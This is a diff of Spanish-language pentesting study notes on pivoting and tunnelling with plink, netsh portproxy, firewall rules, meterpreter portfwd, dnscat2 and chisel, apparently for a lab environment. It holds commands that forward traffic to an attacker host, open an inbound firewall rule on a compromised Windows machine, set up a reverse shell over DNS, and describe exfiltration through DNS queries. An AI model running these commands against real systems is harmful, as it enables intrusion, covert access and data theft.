@@ -147,6 +147,10 @@ Si la red a la que queremos acceder tiene un cortafuegos que no permite tráfico
 - Y tenemos un túnel socks creado con el que podemos utilizar proxychains con normalidad
 #### `plink`
 Algunas versiones de Windows **no tienen cliente SSH instalado de forma nativa**, por lo que es necesario utilizar una herramienta alternativa como **`plink`** (de **PuTTY**). Solo permite remote port forwarding
+- Ubicación en pwnbox
+	```bash
+	/usr/share/windows-resources/binaries/plink.exe
+	```
 - Funcionamiento general
 ```powershell
 cmd.exe /c echo y | plink.exe -ssh -l [attacker_username] -pw [attacker_ssh_password] -R [attacker_ip]:[attacker_port]:[victim_ip]:[victim_port] [attacker_ip]
@@ -181,17 +185,27 @@ Nos sirve para pivotar si tenemos acceso a al máquina, aunque es menos potente 
 ```powershell
 netsh interface portproxy add v4tov4 listenport=<puerto_local> listenaddress=<IP_local> connectport=<puerto_destino> connectaddress=<IP_destino>
 ```
-##### Ejemplo revshell
-Tráfico del puerto `44444` de la máquina `$pwned` se redirige a el `4444` de nuestra `$pwnbox`
+##### Ejemplo ssh
+Tráfico del puerto `2222` de la máquina `$pwned` se redirige a el `22` de  `$target`
 ```powershell
-netsh interface portproxy add v4tov4 listenport=44444 listenaddress=0.0.0.0 connectport=4444 connectaddress=$pwnbox
+netsh interface portproxy add v4tov4 listenport=2222 listenaddress=0.0.0.0 connectport=22 connectaddress=$target
+```
+La máquina quedaría en escucha, pero no funcionaría si hay reglas de firewall que se aplican
+#### Crear reglas de firewall firewall
+Supongamos que en el ejemplo en el que redirigimos el puerto 2222 de `$pwned` no tenemos acceso de forma externa. Debemos crear una regla que permita el tráfico desde fuera al puerto 2222
+```powershell
+netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=$pwnbox localport=2222 action=allow
+```
+Eliminar la regla una vez creada: 
+```powershell
+netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
 ```
 #### Comprobar port forward
-```cmd
-netsh.exe interface portproxy show v4tov4
+```powershell
+netsh interface portproxy show v4tov4
 ```
 #### Eliminar reglas
-```bash
+```powershell
 netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
 ```
 ## Proxychains
@@ -341,7 +355,7 @@ meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
 ```
 Redirige el tráfico del puerto `1234` de la máquina víctima al puerto `8081` de nuestra pwnbox
 ## Dnscat2
-**`dnscat2`** es una herramienta de **comunicación a través del protocolo DNS**, diseñada para crear túneles y canales de comunicación en situaciones en las que otros protocolos de red están bloqueados.
+**`dnscat2`** es una herramienta de **comunicación a través del protocolo DNS**, diseñada para crear túneles y canales de comunicación en situaciones en las que otros protocolos de red están bloqueados. Envía datos a través de consultas de subdominios DNS e infiltra datos con registros TXT y otros. 
 Vemos un ejemplo de cómo ejecutar una revshell con este protocolo
 ### Servidor - máquina atacante
 ```bash
@@ -365,7 +379,7 @@ window -i 1
 ## Chisel
 Herramienta escrita en go que permite crear túneles TCP/UDP entre sistemas
 ### Modo servidor
-Se ejecuta en la máquina atacante
+Se ejecuta en la `pwnbox`
 ```bash
 ./chisel server -p 8000 --reverse -v
 ```
